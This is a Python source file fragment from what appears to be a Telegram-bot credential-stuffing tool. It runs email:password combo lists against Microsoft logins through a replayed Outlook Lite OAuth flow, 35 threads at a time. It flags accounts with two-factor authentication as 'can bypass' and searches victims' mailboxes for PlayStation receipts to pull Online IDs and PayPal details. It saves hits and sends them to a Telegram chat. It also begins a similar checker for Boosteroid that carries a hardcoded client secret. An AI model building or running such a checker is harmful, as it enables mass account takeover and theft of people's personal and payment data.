        "(KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
    )

    # Wilson's OAuth client (Outlook Lite Android)
    _CLIENT_ID   = "e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
    _REDIRECT    = "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D"
    _SCOPE       = "profile openid offline_access https://outlook.office.com/M365.Access"

    # GetItem urlpostdata (exact from Wilson — fetches full HTML body of one email)
    _GETITEM_POSTDATA = (
        "%7B%22__type%22%3A%22GetItemJsonRequest%3A%23Exchange%22%2C%22Header%22%3A%7B"
        "%22__type%22%3A%22JsonRequestHeaders%3A%23Exchange%22%2C%22RequestServerVersion%22%3A%22V2018_01_08%22%2C"
        "%22TimeZoneContext%22%3A%7B%22__type%22%3A%22TimeZoneContext%3A%23Exchange%22%2C"
        "%22TimeZoneDefinition%22%3A%7B%22__type%22%3A%22TimeZoneDefinitionType%3A%23Exchange%22%2C"
        "%22Id%22%3A%22Greenwich%20Standard%20Time%22%7D%7D%7D%2C%22Body%22%3A%7B"
        "%22__type%22%3A%22GetItemRequest%3A%23Exchange%22%2C%22ItemShape%22%3A%7B"
        "%22__type%22%3A%22ItemResponseShape%3A%23Exchange%22%2C%22BaseShape%22%3A%22IdOnly%22%2C"
        "%22AddBlankTargetToLinks%22%3Atrue%2C%22BlockContentFromUnknownSenders%22%3Afalse%2C"
        "%22BlockExternalImagesIfSenderUntrusted%22%3Atrue%2C%22ClientSupportsIrm%22%3Atrue%2C"
        "%22CssScopeClassName%22%3A%22rps_61d2%22%2C%22FilterHtmlContent%22%3Atrue%2C"
        "%22FilterInlineSafetyTips%22%3Atrue%2C%22ImageProxyCapability%22%3A%22OwaAndConnectorsProxy%22%2C"
        "%22InlineImageCustomDataTemplate%22%3A%22%7Bid%7D%22%2C"
        "%22InlineImageUrlTemplate%22%3A%22data%3Aimage%2Fgif%3Bbase64%2CR0lGODlhAQABAIAAAAAAAP%2F%2F%2F"
        "yH5BAEAAAEALAAAAAABAAEAAAIBTAA7%22%2C%22MaximumBodySize%22%3A2097152%2C"
        "%22MaximumRecipientsToReturn%22%3A20%2C%22AdditionalProperties%22%3A%5B%7B"
        "%22__type%22%3A%22ExtendedPropertyUri%3A%23Exchange%22%2C"
        "%22PropertyName%22%3A%22EntityExtraction%2FSmartReplyForEmail%22%2C"
        "%22DistinguishedPropertySetId%22%3A%22Common%22%2C%22PropertyType%22%3A%22String%22%7D%5D%2C"
        "%22InlineImageUrlOnLoadTemplate%22%3A%22%22%7D%2C%22ItemIds%22%3A%5B%7B"
        "%22__type%22%3A%22ItemId%3A%23Exchange%22%2C%22Id%22%3A%22{ITEM_ID}%22%7D%5D%2C"
        "%22ShapeName%22%3A%22ItemNormalizedBody%22%7D%7D"
    )

    def __init__(self, chat_id, bot_token, combo_lines, progress_msg_id):
        self.chat_id          = chat_id
        self.bot_token        = bot_token
        self.combo_lines      = combo_lines
        self.progress_msg_id  = progress_msg_id
        self.total_checked    = 0
        self.total_combos     = len(combo_lines)
        self.good_count       = 0
        self.bad_count        = 0
        self.blocked_count    = 0
        self.twofa_count      = 0
        self.psn_hits         = 0   # has PSN emails
        self.no_psn_hits      = 0   # valid MS, no PSN
        self.last_update_time = 0
        self.print_lock       = threading.Lock()
        self.on_complete_callback = None

        self.results_folder = f"Results/{self.chat_id}"
        os.makedirs(self.results_folder, exist_ok=True)
        self.hits_file = f"{self.results_folder}/PSN_Full_Capture_Hits_by_@hulliyu.txt"
        self.free_file = f"{self.results_folder}/PSN_Full_Capture_Free_by_@hulliyu.txt"
        self.twfa_file = f"{self.results_folder}/PSN_Full_Capture_2FA_by_@hulliyu.txt"
        for fpath, label in [
            (self.hits_file, "PSN Hits"),
            (self.free_file, "Valid MS (No PSN)"),
            (self.twfa_file, "2FA / CAN BYPASS"),
        ]:
            with open(fpath, "w", encoding="utf-8") as f:
                f.write(f"# {label} — {MY_SIGNATURE} {TELEGRAM_CHANNEL}\n\n")

    def _save(self, line, category="hit"):
        fp = {"hit": self.hits_file, "free": self.free_file, "2fa": self.twfa_file}.get(category, self.free_file)
        with open(fp, "a", encoding="utf-8") as f:
            f.write(line + "\n")

    # ── STEP 1: Microsoft OAuth Login (Wilson's exact flow) ──────────────────

    def _ms_login(self, email: str, password: str):
        """
        Returns (status, access_token, cid_upper, session_obj)
        status: 'hit' | 'bad' | 'blocked' | '2fa' | 'bypass' | 'ratelimit' | 'error'
        """
        try:
            session = requests.Session()
            ua = self._UA_MOBILE

            # Step 1 — GET authorize page
            auth_url = (
                "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize"
                f"?client_info=1&haschrome=1&login_hint={urllib.parse.quote(email)}"
                f"&client_id={self._CLIENT_ID}&mkt=en&response_type=code"
                f"&redirect_uri={self._REDIRECT}"
                f"&scope={urllib.parse.quote(self._SCOPE)}"
            )
            r1 = session.get(auth_url, headers={
                "Host": "outlook.live.com",
                "upgrade-insecure-requests": "1",
                "user-agent": ua,
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "x-requested-with": "com.microsoft.outlooklite",
                "sec-fetch-site": "none", "sec-fetch-mode": "navigate",
                "sec-fetch-user": "?1", "sec-fetch-dest": "document",
                "accept-encoding": "gzip, deflate", "accept-language": "en-US,en;q=0.9",
            }, timeout=15, allow_redirects=True)

            src1 = r1.text
            cok1 = session.cookies.get_dict()

            # Check IfExistsResult — account existence
            if '"IfExistsResult":1' in src1:
                return 'bad', None, None, None
            if any(x in src1 for x in ['{"ErrorHR":"80041103"}', '{"ErrorHR":"8004835D"}']):
                return 'bad', None, None, None

            # Parse PPFT + urlPost (Wilson: LR "name=\"PPFT\" id=\"i0327\" value=\"" "\"")
            ppft = ""
            try:
                ppft = src1.split('name=\\"PPFT\\" id=\\"i0327\\" value=\\"')[1].split('\\"')[0]
            except Exception:
                try:
                    ppft = src1.split('name="PPFT" id="i0327" value="')[1].split('"')[0]
                except Exception:
                    pass
            if not ppft:
                return 'error', None, None, None

            # Parse urlPost (Wilson: LR "urlPost:'" "'")
            pl = ""
            for pat in ["urlPost:'", 'urlPost:"']:
                if pat in src1:
                    try:
                        pl = src1.split(pat)[1].split("'" if "'" in pat else '"')[0]
                        break
                    except Exception:
                        pass
            if not pl:
                return 'error', None, None, None

            # URL-encode PPFT (Wilson: EncodeOutput=TRUE)
            ppft_enc = urllib.parse.quote(ppft, safe='')

            # Build login body (exact Wilson payload)
            login_body = (
                f"i13=1&login={urllib.parse.quote(email)}&loginfmt={urllib.parse.quote(email)}"
                f"&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit="
                f"&passwd={urllib.parse.quote(password)}&ps=2&psRNGCDefaultType=&psRNGCEntropy="
                f"&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft_enc}&PPSX=Passport"
                f"&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0"
                f"&isSignupPost=0&isRecoveryAttemptPost=0&i19=3772"
            )

            # Step 2 — POST login (Wilson's exact headers + cookies)
            r2 = session.post(pl, data=login_body, headers={
                "User-Agent": ua + " PKeyAuth/1.0",
                "Pragma": "no-cache",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "Host": "login.live.com",
                "Connection": "keep-alive",
                "Content-Length": str(len(login_body)),
                "Cache-Control": "max-age=0",
                "Upgrade-Insecure-Requests": "1",
                "Origin": "https://login.live.com",
                "Content-Type": "application/x-www-form-urlencoded",
                "X-Requested-With": "com.microsoft.outlooklite",
                "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document",
                "Referer": r1.url,
                "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9",
                "Cookie": (
                    f"MSPRequ={cok1.get('MSPRequ','')}; uaid={cok1.get('uaid','')}; "
                    f"MSPOK={cok1.get('MSPOK','')}; OParams={cok1.get('OParams','')}"
                ),
            }, allow_redirects=False, timeout=15)

            src2     = r2.text
            loc2     = r2.headers.get("Location", "")
            cok2     = session.cookies.get_dict()

            # Wilson ERRORS count
            errors = src2.lower().count("error")

            # Check results (Wilson keychain order)
            cookies_str = str(cok2)
            if "JSH" in cookies_str or "JSHP" in cookies_str:
                pass  # SUCCESS path
            elif 'action="https://account.live.com/Consent/Update' in src2:
                pass  # SUCCESS
            elif "https://login.live.com/oauth20_desktop.srf?" in loc2:
                pass  # SUCCESS
            elif "account or password is incorrect" in src2 or errors > 0:
                return 'bad', None, None, None
            elif "https://account.live.com/identity/confirm" in src2 or "/identity/confirm" in loc2:
                return 'bypass', None, None, None
            elif "https://account.live.com/recover" in src2 or "/recover" in loc2:
                return '2fa', None, None, None
            elif ("https://account.live.com/Abuse" in src2
                  or "finisherror.srf" in loc2 or "Abuse" in loc2):
                return 'blocked', None, None, None
            elif "too many times with" in src2:
                return 'ratelimit', None, None, None

            # Handle /cancel?mkt redirect (Wilson's IF block)
            if "/cancel?mkt" in src2:
                try:
                    opt  = src2.split("opidt%3d")[1].split('"')[0]
                    op   = src2.split("opid%3d")[1].split("%26")[0]
                    uid2 = src2.split('name="uaid" id="uaid" value="')[1].split('"')[0]
                    r3 = session.get(
                        f"https://login.live.com/oauth20_authorize.srf?uaid={uid2}"
                        f"&client_id={self._CLIENT_ID}&opid={op}&mkt=EN-US"
                        f"&opidt={opt}&res=success&route=C105_BAY",
                        headers={
                            "Host": "login.live.com", "Connection": "keep-alive",
                            "Upgrade-Insecure-Requests": "1",
                            "User-Agent": ua + " PKeyAuth/1.0",
                            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                            "X-Requested-With": "com.microsoft.outlooklite",
                            "Sec-Fetch-Site": "same-site", "Sec-Fetch-Mode": "navigate",
                            "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document",
                            "Referer": "https://account.live.com/",
                            "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9",
                            "Cookie": (
                                f"__Host-MSAAUTHP={cok2.get('__Host-MSAAUTHP','')}; PPLState=1; "
                                f"MSPPre={cok2.get('MSPPre','')}; MSPCID={cok2.get('MSPCID','')}; "
                                f"MSPVis={cok2.get('MSPVis','')}; OParams={cok2.get('OParams','')}; "
                                f"MSPBack={cok2.get('MSPBack','')}; mkt=en-US; mkt1=en-US"
                            ),
                        }, allow_redirects=False, timeout=15)
                    loc3 = r3.headers.get("Location", "")
                    cok3 = session.cookies.get_dict()
                    ck3s = str(cok3)
                    if "JSH" in ck3s or "JSHP" in ck3s:
                        cok2 = cok3
                        loc2 = loc3
                    elif "/identity/confirm" in loc3:
                        return 'bypass', None, None, None
                    elif "/recover" in loc3:
                        return '2fa', None, None, None
                    elif "/Abuse" in loc3 or "/finisherror.srf" in loc3 or "/cancel?" in loc3:
                        return 'blocked', None, None, None
                except Exception:
                    pass

            # Extract auth code from Location header
            code = ""
            try:
                code = loc2.split("code=")[1].split("&")[0]
            except Exception:
                pass
            if not code:
                # Try to find code in URL
                try:
                    code = re.search(r'code=([^&\s"]+)', loc2 + src2).group(1)
                except Exception:
                    return 'error', None, None, None

            # Step 3 — Exchange code for token (Wilson's exact token POST)
            cid_raw = cok2.get("MSPCID", "")
            r_tok = session.post(
                "https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
                data=(
                    f"client_info=1&client_id={self._CLIENT_ID}"
                    f"&redirect_uri={self._REDIRECT}"
                    f"&grant_type=authorization_code&code={code}"
                    f"&scope={urllib.parse.quote(self._SCOPE)}"
                ),
                headers={
                    "return-client-request-id": "false",
                    "User-Agent": self._UA_MSAL,
                    "Host": "login.microsoftonline.com",
                    "x-client-Ver": "1.0.0+635e350c",
                    "x-client-OS": "28",
                    "x-client-SKU": "MSAL.xplat.android",
                    "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
                    "Connection": "Keep-Alive",
                    "Accept-Encoding": "gzip",
                }, timeout=15)

            try:
                access_token = r_tok.json().get("access_token", "")
            except Exception:
                access_token = ""
            if not access_token:
                return 'error', None, None, None

            cid_upper = cid_raw.upper()
            return 'hit', access_token, cid_upper, session

        except Exception as e:
            return 'error', None, None, None

    # ── STEP 2: Get profile (Name, Country, Birthdate) ───────────────────────

    def _get_profile(self, token: str, cid: str) -> dict:
        try:
            r = requests.get(
                "https://substrate.office.com/profileb2/v2.0/me/V1Profile",
                headers={
                    "User-Agent": self._UA_OWA,
                    "Pragma": "no-cache",
                    "Accept": "application/json",
                    "ForceSync": "false",
                    "Authorization": f"Bearer {token}",
                    "X-AnchorMailbox": f"CID:{cid}",
                    "Host": "substrate.office.com",
                    "Connection": "Keep-Alive",
                    "Accept-Encoding": "gzip",
                }, timeout=12)
            d = r.json()
            name    = d.get("displayName") or "N/A"
            country = d.get("location")    or "N/A"
            bd      = f"{d.get('birthYear','?')}-{d.get('birthMonth','?')}-{d.get('birthDay','?')}"
            return {"name": name, "country": country, "birthdate": bd}
        except Exception:
            return {"name": "N/A", "country": "N/A", "birthdate": "N/A"}

    # ── STEP 3: Search PSN emails in Outlook (Wilson's exact query) ───────────

    def _search_psn_emails(self, token: str, cid: str, email: str) -> tuple:
        """
        Returns (total_count, encoded_item_id)
        Uses Wilson's exact endpoint: outlook.live.com/search/api/v2/query
        Query: reply@txn-email.playstation.com
        """
        try:
            payload = json.dumps({
                "Cvid": "7ef2720e-6e59-ee2b-a217-3a4f427ab0f7",
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "Egypt Standard Time",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {"Or": [
                        {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                        {"Term": {"DistinguishedFolderName": "DeletedItems"}}
                    ]},
                    "From": 0,
                    "Query": {"QueryString": "reply@txn-email.playstation.com"},
                    "RefiningQueries": [],
                    "Size": 5,
                    "Fields": [
                        {"Name": "ConversationId"},
                        {"Name": "Subject"},
                        {"Name": "ItemId"},
                        {"Name": "From"},
                        {"Name": "ReceivedTime"}
                    ],
                    "Refiners": []
                }]
            })
            r = requests.post(
                "https://outlook.live.com/search/api/v2/query"
                "?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124",
                data=payload,
                headers={
                    "User-Agent": self._UA_OWA,
                    "Pragma": "no-cache",
                    "Accept": "application/json",
                    "ForceSync": "false",
                    "Authorization": f"Bearer {token}",
                    "X-AnchorMailbox": f"CID:{cid}",
                    "Host": "substrate.office.com",
                    "Connection": "Keep-Alive",
                    "Accept-Encoding": "gzip",
                    "Content-Type": "application/json",
                }, timeout=15)

            src = r.text
            total = 0
            item_id_encoded = ""

            # Parse Total (Wilson: PARSE JSON "Total")
            try:
                total = int(re.search(r'"Total"\s*:\s*(\d+)', src).group(1))
            except Exception:
                pass

            # Parse ItemId (Wilson: PARSE LR "\"ItemId\":{\"Id\":\"" "\"" EncodeOutput=TRUE)
            try:
                item_id_raw = src.split('"ItemId":{"Id":"')[1].split('"')[0]
                item_id_encoded = urllib.parse.quote(item_id_raw, safe='')
            except Exception:
                pass

            return total, item_id_encoded

        except Exception:
            return 0, ""

    # ── STEP 4: Fetch email body via OWA GetItem (Wilson's exact call) ───────

    def _get_item_body(self, token: str, cid: str,
                       email: str, item_id_encoded: str) -> str:
        """
        Wilson's exact GetItem endpoint with the massive urlpostdata.
        Returns raw HTML body of the PSN email.
        """
        if not item_id_encoded:
            return ""
        try:
            # Build postdata with the item id substituted
            postdata = self._GETITEM_POSTDATA.replace("{ITEM_ID}", item_id_encoded)
            r = requests.post(
                f"https://outlook-sdf.live.com/owa/{urllib.parse.quote(email)}"
                f"/service.svc?action=GetItem&app=Mini&n=47",
                data="",
                headers={
                    "User-Agent": self._UA_OWA,
                    "Pragma": "no-cache",
                    "Accept": "*/*",
                    "ForceSync": "false",
                    "X-AnchorMailbox": f"CID:{cid}",
                    "Host": "substrate.office.com",
                    "Connection": "Keep-Alive",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "en-US,en;q=0.9",
                    "x-owa-urlpostdata": postdata,
                    "x-owa-host-app": "outlook_android",
                    "prefer": 'exchange.behavior="IncludeThirdPartyOnlineMeetingProviders"',
                    "x-req-source": "Mail",
                    "x-owa-canary": "X-OWA-CANARY_cookie_is_null_or_empty",
                    "authorization": f"Bearer {token}",
                    "user-agent": self._UA_MOBILE,
                    "action": "GetItem",
                    "ms-cv": "oFL6CcEOn98dlE/alv3qke.47",
                    "content-type": "application/json; charset=utf-8",
                    "x-owa-hosted-ux": "true",
                    "origin": "https://outlook-sdf.live.com",
                    "x-requested-with": "com.microsoft.outlooklite",
                    "sec-fetch-site": "same-origin",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-dest": "empty",
                    "Content-Type": "application/x-www-form-urlencoded",
                }, timeout=20)
            return r.text
        except Exception:
            return ""

    # ── STEP 5: Parse Online ID + PayPal from email body ─────────────────────

    def _parse_psn_body(self, body: str) -> tuple:
        """
        Wilson: PARSE LR "ID online:&nbsp;" "<"  → Online ID
                PARSE LR "PAYPALDI " " "          → PayPal
        """
        online_id = "N/A"
        paypal    = "N/A"

        # Online ID — Wilson's exact markers
        for marker_l, marker_r in [
            ("ID online:&nbsp;", "<"),
            ("ID online: ", "<"),
            ("ID online:", "<"),
            ("Online ID:&nbsp;", "<"),
            ("Online ID: ", "<"),
        ]:
            if marker_l in body:
                try:
                    chunk = body.split(marker_l)[1].split(marker_r)[0]
                    chunk = re.sub(r'<[^>]+>', '', chunk).strip()
                    if chunk and 3 <= len(chunk) <= 20:
                        online_id = chunk
                        break
                except Exception:
                    pass

        # Fallback: regex scan
        if online_id == "N/A":
            m = re.search(
                r'(?:ID online|Online ID)[^a-zA-Z0-9_\-]*([A-Za-z0-9_\-]{3,20})',
                re.sub(r'<[^>]+>', ' ', body)
            )
            if m:
                online_id = m.group(1).strip()

        # PayPal — Wilson: LR "PAYPALDI " " "
        if "PAYPALDI " in body:
            try:
                paypal = body.split("PAYPALDI ")[1].split(" ")[0].strip()
                paypal = re.sub(r'<[^>]+>', '', paypal)[:60]
            except Exception:
                pass

        return online_id, paypal

    # ── STEP 6: Exophase stats (Wilson: multipart POST → 10s delay → GET) ────

    def _get_exophase_stats(self, online_id: str) -> dict:
        """
        Wilson's exact Exophase flow:
          1. POST multipart to api.exophase.com/public/card/generate
          2. Delay 10 seconds
          3. GET the returned link
          4. Parse Games Owned, Total Trophies, Playtime
        """
        if not online_id or online_id in ("N/A", ""):
            return {}
        try:
            boundary = "----WebKitFormBoundaryiWYW6URRwjdlO8o9"
            # Build multipart body exactly as Wilson
            body_parts = [
                f"--{boundary}\r\nContent-Disposition: form-data; name=\"sections\"\r\n\r\n"
                f'{{"bottom":{{"service":"psn","username":"{online_id}","gamedata_type":"awards"}},'
                f'"top":{{"service":"psn","username":"{online_id}","gamedata_type":"games"}}}}',
                f"--{boundary}\r\nContent-Disposition: form-data; name=\"color\"\r\n\r\n"
                f'{{"1":"","2":"","data":null}}',
                f"--{boundary}\r\nContent-Disposition: form-data; name=\"skin\"\r\n\r\n1",
                f"--{boundary}--",
            ]
            body_str = "\r\n".join(body_parts)

            r = requests.post(
                "https://api.exophase.com/public/card/generate",
                data=body_str.encode(),
                headers={
                    "User-Agent": self._UA_DESK,
                    "Pragma": "no-cache",
                    "Accept": "*/*",
                    "Content-Type": f"multipart/form-data; boundary={boundary}",
                }, timeout=20)

            result = r.json()

            # Check Wilson keychains
            raw = r.text
            if '"valid":true,"success":true' not in raw:
                if "Profile does not exist" in raw or "Profile is private" in raw:
                    return {"games": "Private/N/A", "trophies": "N/A", "playtime": "N/A"}
                return {}

            link = result.get("link", "")
            if not link:
                return {}

            # Wilson: Delay 10000ms then GET link
            time.sleep(10)

            page = requests.get(link, headers={
                "User-Agent": self._UA_DESK,
                "Pragma": "no-cache",
                "Accept": "*/*",
            }, timeout=20).text

            if "This profile is either private or no games have been played" in page:
                return {"games": "Private", "trophies": "N/A", "playtime": "N/A"}

            games    = "N/A"
            trophies = "N/A"
            playtime = "N/A"

            # Wilson: PARSE LR "<i class=\"exo-icon exo-icon-gamepad\"></i>" "</span>"
            try:
                raw_g = page.split('<i class="exo-icon exo-icon-gamepad"></i>')[1].split("</span>")[0]
                games = re.sub(r'<[^>]+>', '', raw_g).strip()
            except Exception:
                pass

            # Wilson: PARSE LR "<i class=\"exo-icon exo-icon-award\"></i>" "</span>"
            try:
                raw_t = page.split('<i class="exo-icon exo-icon-award"></i>')[1].split("</span>")[0]
                trophies = re.sub(r'<[^>]+>', '', raw_t).strip()
            except Exception:
                pass

            # Wilson: PARSE LR "<i class=\"exo-icon exo-icon-playtime\"></i>" "<span>"
            try:
                raw_p = page.split('<i class="exo-icon exo-icon-playtime"></i>')[1].split("<span>")[0]
                playtime = re.sub(r'<[^>]+>', '', raw_p).strip()
            except Exception:
                pass

            return {"games": games, "trophies": trophies, "playtime": playtime}

        except Exception:
            return {}

    # ── Main account processor ────────────────────────────────────────────────

    def process_account(self, email: str, password: str):
        try:
            status, token, cid, session = self._ms_login(email, password)

            # Bad / blocked / 2FA
            if status in ('bad', 'error'):
                with self.print_lock:
                    self.total_checked += 1
                    self.bad_count += 1
                self.update_telegram_progress()
                return

            if status in ('ratelimit', 'blocked'):
                with self.print_lock:
                    self.total_checked += 1
                    self.blocked_count += 1
                self.update_telegram_progress()
                return

            if status in ('2fa', 'bypass'):
                line = f"🔐 {email}:{password} | Status:{status.upper()}"
                self._save(line, "2fa")
                with self.print_lock:
                    self.total_checked += 1
                    self.twofa_count += 1
                    self.good_count  += 1
                self.update_telegram_progress()
                return

            # SUCCESS — get profile
            profile  = self._get_profile(token, cid)
            name     = profile["name"]
            country  = profile["country"]
            birthdate= profile["birthdate"]

            # Search PSN emails (Wilson: query=reply@txn-email.playstation.com)
            total_psn, item_id_enc = self._search_psn_emails(token, cid, email)
            has_psn  = total_psn > 0 and item_id_enc

            # Check for 2-step via Wilson keychain
            # (if PSN email body contains 2FA clue — already handled at login)

            online_id = "N/A"
            paypal    = "N/A"
            exo       = {}

            if has_psn:
                # Fetch email body via GetItem
                body = self._get_item_body(token, cid, email, item_id_enc)
                if body:
                    online_id, paypal = self._parse_psn_body(body)
                    # Check Wilson 2FA keychain from email body
                    if "2-Step Verification is now activated for your account" in body:
                        pass  # just note it, still a hit

                # Exophase stats
                if online_id not in ("N/A", ""):
                    exo = self._get_exophase_stats(online_id)

            # Build result line
            base = f"{email}:{password}"
            info = (
                f" | Name:{name}"
                f" | Country:{country}"
                f" | Born:{birthdate}"
                f" | PSN Emails:{total_psn}"
            )
            if has_psn:
                info += f" | Online ID:{online_id}"
                if paypal not in ("N/A", ""):
                    info += f" | PayPal:{paypal}"
                if exo:
                    info += (
                        f" | Games:{exo.get('games','N/A')}"
                        f" | Trophies:{exo.get('trophies','N/A')}"
                        f" | Playtime:{exo.get('playtime','N/A')}"
                    )
            line = base + info

            cat = "hit" if has_psn else "free"
            self._save(line, cat)

            with self.print_lock:
                self.total_checked += 1
                self.good_count    += 1
                if has_psn:
                    self.psn_hits += 1
                else:
                    self.no_psn_hits += 1

        except Exception:
            with self.print_lock:
                self.total_checked += 1
                self.bad_count += 1

        self.update_telegram_progress()

    # ── Progress + results ────────────────────────────────────────────────────

    def update_telegram_progress(self, force=False):
        if not force and (time.time() - self.last_update_time < 4.0):
            return
        with self.print_lock:
            if not force and (time.time() - self.last_update_time < 4.0):
                return
            self.last_update_time = time.time()
            tc, to = self.total_checked, self.total_combos
            gc, bc, bk = self.good_count, self.bad_count, self.blocked_count
            ph, np_, tf = self.psn_hits, self.no_psn_hits, self.twofa_count

        pct  = (tc / to * 100) if to > 0 else 0
        bar  = "█" * int(pct / 100 * 18) + "▒" * (18 - int(pct / 100 * 18))
        done = tc >= to
        msg  = (
            f"🕹️ <b>PSN FULL CAPTURE — WILSON EDITION</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📈 <code>{tc}/{to}</code> ({pct:.1f}%)\n"
            f"[{bar}]\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"✅ Valid MS    : <b>{gc}</b>\n"
            f"❌ Bad/Wrong  : <b>{bc}</b>\n"
            f"🔒 Blocked    : <b>{bk}</b>\n"
            f"🔐 2FA/Bypass : <b>{tf}</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🎮 PSN Hits   : <b>{ph}</b>  (OnlineID + Stats)\n"
            f"📁 No PSN     : <b>{np_}</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{'✅ <b>اكتمل الفحص!</b>' if done else '⏳ جارٍ الفحص...'}\n"
            f"💎 {MY_SIGNATURE}  📢 {TELEGRAM_CHANNEL}"
        )
        edit_message(self.bot_token, self.chat_id, self.progress_msg_id, msg)

    def start_scan(self):
        def run():
            try:
                # Wilson suggests 70 bots — we use 35 threads (reasonable for API)
                with ThreadPoolExecutor(max_workers=35) as ex:
                    futures = []
                    for line in self.combo_lines:
                        line = line.strip()
                        if ":" not in line:
                            continue
                        u, p = line.split(":", 1)
                        futures.append(ex.submit(self.process_account, u.strip(), p.strip()))
                    for fut in futures:
                        try:
                            fut.result()
                        except Exception:
                            pass
                self.update_telegram_progress(force=True)
                self.send_final_results()
            except Exception as e:
                send_message(self.bot_token, self.chat_id, f"❌ PSN Error: {esc(e)}")
            finally:
                if self.on_complete_callback:
                    self.on_complete_callback(self.chat_id)
        threading.Thread(target=run, daemon=True).start()

    def send_final_results(self):
        summary = (
            f"🕹️ <b>PSN Full Capture — اكتمل!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📊 إجمالي مفحوص : <code>{self.total_checked}</code>\n"
            f"✅ Valid MS      : <code>{self.good_count}</code>\n"
            f"❌ خاطئ          : <code>{self.bad_count}</code>\n"
            f"🔒 Blocked       : <code>{self.blocked_count}</code>\n"
            f"🔐 2FA/Bypass    : <code>{self.twofa_count}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🎮 PSN Hits     : <code>{self.psn_hits}</code>  (Online ID + Trophies)\n"
            f"📁 No PSN       : <code>{self.no_psn_hits}</code>\n\n"
            f"💎 <b>{MY_SIGNATURE}</b>  📢 {TELEGRAM_CHANNEL}"
        )
        send_message(self.bot_token, self.chat_id, summary)
        if self.psn_hits > 0 and os.path.exists(self.hits_file):
            send_document(self.bot_token, self.chat_id, self.hits_file,
                          caption=f"🎮 PSN Full Capture Hits\n{MY_SIGNATURE} {TELEGRAM_CHANNEL}")
        if self.no_psn_hits > 0 and os.path.exists(self.free_file):
            send_document(self.bot_token, self.chat_id, self.free_file,
                          caption=f"📁 Valid MS (No PSN)\n{MY_SIGNATURE}")
        if self.twofa_count > 0 and os.path.exists(self.twfa_file):
            send_document(self.bot_token, self.chat_id, self.twfa_file,
                          caption=f"🔐 2FA / CAN BYPASS\n{MY_SIGNATURE}")
        if not self.psn_hits and not self.no_psn_hits and not self.twofa_count:
            send_message(self.bot_token, self.chat_id, "ℹ️ لم يُعثر على حسابات صالحة.")


# ══════════════════════════════════════════════════════════════════════════════
# GATE 8: BOOSTEROID CLOUD GAMING CHECKER
# ══════════════════════════════════════════════════════════════════════════════

class BoosteroidChecker:
    CLIENT_ID     = "3"
    CLIENT_SECRET = "FWEue1aHX9pWaqksbA3f6eskbWNplTdA4wwbnrQP"
    UA            = "BoosteroidAndroidClient v.1.5.6; Android 9"

    def __init__(self, chat_id, bot_token, combo_lines, progress_msg_id):
        self.chat_id  = chat_id
        self.bot_token= bot_token
        self.combo_lines = combo_lines
        self.progress_msg_id = progress_msg_id
        self.total_checked = 0
        self.total_combos  = len(combo_lines)
        self.good_count    = 0
        self.bad_count     = 0
        self.blocked_count = 0
        self.sub_hits      = 0
        self.free_hits     = 0
        self.last_update_time = 0
        self.print_lock = threading.Lock()
        self.on_complete_callback = None
        self.results_folder = f"Results/{self.chat_id}"
        os.makedirs(self.results_folder, exist_ok=True)
        self.hits_file = f"{self.results_folder}/Boosteroid_Sub_by_@hulliyu.txt"
        self.free_file = f"{self.results_folder}/Boosteroid_Free_by_@hulliyu.txt"
        with open(self.hits_file,"w",encoding="utf-8") as f:
            f.write(f"# Boosteroid Subscribed — {MY_SIGNATURE} {TELEGRAM_CHANNEL}\n\n")
        with open(self.free_file,"w",encoding="utf-8") as f:
            f.write(f"# Boosteroid Free — {MY_SIGNATURE} {TELEGRAM_CHANNEL}\n\n")

    def save_hit(self, line, has_sub=True):
        with open(self.hits_file if has_sub else self.free_file, "a", encoding="utf-8") as f:
            f.write(line + "\n")

    @staticmethod
    def calculate_nonce(email: str, password: str) -> int:
        input_bytes = (email.lower() + password).encode("utf-8")
        data = bytearray(4 + len(input_bytes))
        data[4:] = input_bytes
        sha = hashlib.sha512
        for counter in range(0x7FFFFFFF):
            data[0] = (counter >> 24) & 0xFF
            data[1] = (counter >> 16) & 0xFF
            data[2] = (counter >> 8)  & 0xFF
            data[3] =  counter        & 0xFF
            h = sha(bytes(data)).digest()
            if h[0] == 0 and h[1] == 0:
                return counter
        return -1

    def _api_headers(self, token="", token_data=""):
        h = {
            "User-Agent":     self.UA,
            "Accept":         "application/json",
            "Content-Type":   "application/json",
            "Host":           "cloud.boosteroid.com",
            "Accept-Encoding":"gzip",
        }
        if token:
            h["Authorization"]      = token
